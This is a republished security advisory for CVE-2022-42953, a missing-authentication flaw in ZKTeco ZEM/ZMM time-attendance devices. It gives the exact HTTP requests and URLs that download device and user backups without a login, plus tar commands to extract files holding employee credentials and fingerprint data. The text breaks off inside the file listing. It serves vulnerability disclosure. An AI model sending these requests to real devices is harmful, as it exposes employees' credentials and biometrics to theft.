---
title: ZKTeco ZEM500-510-560-760 / ZEM600-800 / ZEM720 / ZMM Missing Authentication
url: https://cxsecurity.com/issue/WLB-2022100065
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-26
fetch_date: 2025-10-03T20:51:19.928058
---

# ZKTeco ZEM500-510-560-760 / ZEM600-800 / ZEM720 / ZMM Missing Authentication

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ZKTeco ZEM500-510-560-760 / ZEM600-800 / ZEM720 / ZMM Missing Authentication** **2022-10-25 / 2022-10-26**  Credit:  **[Anonymouse](https://cxsecurity.com/author/Anonymouse/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-42953](https://cxsecurity.com/cveshow/CVE-2022-42953/ "Click to see CVE-2022-42953")**  CWE: **N/A** | |

Advisory: Missing Authentication in ZKTeco ZEM/ZMM Web Interface
The ZKTeco time attendance device does not require authentication to use the
web interface, exposing the database of employees and their credentials.
Details
=======
Product: ZKTeco ZEM500-510-560-760, ZEM600-800, ZEM720, ZMM
Affected Versions: potentially versions below 8.88 (ZEM500-510-560-760, ZEM600-800, ZEM720) and 15.00 (ZMM200-220-210)
Fixed Versions: firmware version 8.88 (ZEM500-510-560-760, ZEM600-800, ZEM720), firmware version 15.00 (ZMM200-220-210)
Vulnerability Type: Missing Authentication
Security Risk: medium
Vendor URL: https://zkteco.eu/company/history
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2021-003
Advisory Status: published
CVE: CVE-2022-42953
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42953
Introduction
============
"Time attendance and workforce management is an integrated set of
processes that an institution uses to optimize the productivity of its
employees on the individual, departmental, and entity-wide levels.
ZKTeco has been at the forefront of time attendance solutions for the
last 30 years, integrating advanced biometric technologies with
innovative and versatile terminals." (from company website)
More Details
============
The ZKTeco ZEM/ZMM device allows to store a list of users and their credentials
which may be used to log into the device to prove the users' attendance. These
credentials can either be a PIN, a card for a variety of card readers, or a
fingerprint. The user list can be managed through the web interface.
When opening the web interface, for example on http://192.0.2.1/,
the web server of the device sends a Set-Cookie header for a cookie with
name and value similar to the following:
-----------------------------------------------------------------------
Set-Cookie: SessionID=1624553126; path=/;
-----------------------------------------------------------------------
It was determined that the value of the cookie is roughly the number of
seconds since January 1, 1970. Since the value has a constant offset,
that might allow attackers to guess the cookie value. After setting the
cookie, the webserver redirects the browser to "/csl/login". The login
form provided at this URL has its form action set to "/csl/check". If
the user provides wrong credentials, the web server responds with an
error message. If the user provides correct credentials, the server
responds with a frameset.
In this frameset various options are available, for example a user list.
The list contains a link titled "Options" for each user item which
references a URL similar to the following
http://192.0.2.1/csl/user?did=0&uid=123
Additionally, backups of all settings of the device can be downloaded
from the backup page. The request to do so looks similar to the
following:
-----------------------------------------------------------------------
POST /form/DataApp HTTP/1.1
Host: 192.0.2.1
User-Agent: Mozilla/5.0
Cookie: SessionID=1624553126
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Origin: http://192.0.2.1
Referer: http://192.0.2.1/form/Device?act=11
style=1
-----------------------------------------------------------------------
When the value "1" is given for the field named "style", the web server
responds with the file "device.dat" (corresponding to the option "Backup
System Data" in the web interface), for all other values the server
responds with the file "data.dat" (corresponding to the option "Backup
User Data" in the web interface). Both files can not only be requested
using HTTP-POST, but also using HTTP-GET with the following URLs:
http://192.0.2.1/form/DataApp?style=1
http://192.0.2.1/form/DataApp?style=0
Both files are - even though it's not obvious from the filename -
compressed tar archives. They can be extracted in the following way:
-----------------------------------------------------------------------
$ mv data.dat data.tgz
$ tar xvzf data.tgz
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/group.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/htimezone.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/lockgroup.dat
rwxrwxrwx 500/513 10512 2021-06-23 07:23 mnt/mtdblock/ssruser.dat
rwxr-xr-x root/root 819896 2021-06-18 07:23 mnt/mtdblock/tempinfo.dat
rwxrwxrwx 500/513 19456 2005-05-05 07:05 mnt/mtdblock/template.dat
rw-r--r-- root/root 360448 2021-06-18 07:23 mnt/mtdblock/templatev10.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/timezone.dat
rwxrwxrwx 500/513 1372 2005-05-05 07:25 mnt/mtdblock/user.dat
rwxr-xr-x root/root 120 1970-01-01 01:08 mnt/mtdblock/data/alarm.dat
rwxr-xr-x root/root 0 2021-06-23 09:55 mnt/mtdblock/data/extlog.dat
rwxr-xr-x root/root 0 2013-05-04 01:28 mnt/mtdblock/data/extuser.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/data/group.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/data/htimezone.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/data/lockgroup.dat
rwxr-xr-x root/root 54800 2021-06-23 09:55 mnt/mtdblock/data/oplog.dat
rwxr-xr-x root/root 33200 2021-06-23 07:23 mnt/mtdblock/data/sms.dat
rwxr-xr-x root/root 0 2021-06-23 09:55 mnt/mtdblock/data/ssrattlog.dat
rwxr-xr-x root/root 660 2018-11-09 17:28 mnt/mtdblock/data/stkey.dat
rwxrwxrwx 500/513 0 2013-05-04 01:28 mnt/mtdblock/data/template.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/data/timezone.dat
rwxr-xr-x root/root 0 1970-01-01 01:08 mnt/mtdblock/data/transaction.dat
rwxr-xr-x root/root 952 2021-06-23 07:24 mnt/mtdblock/data/udata.dat
rwxr-xr-x ...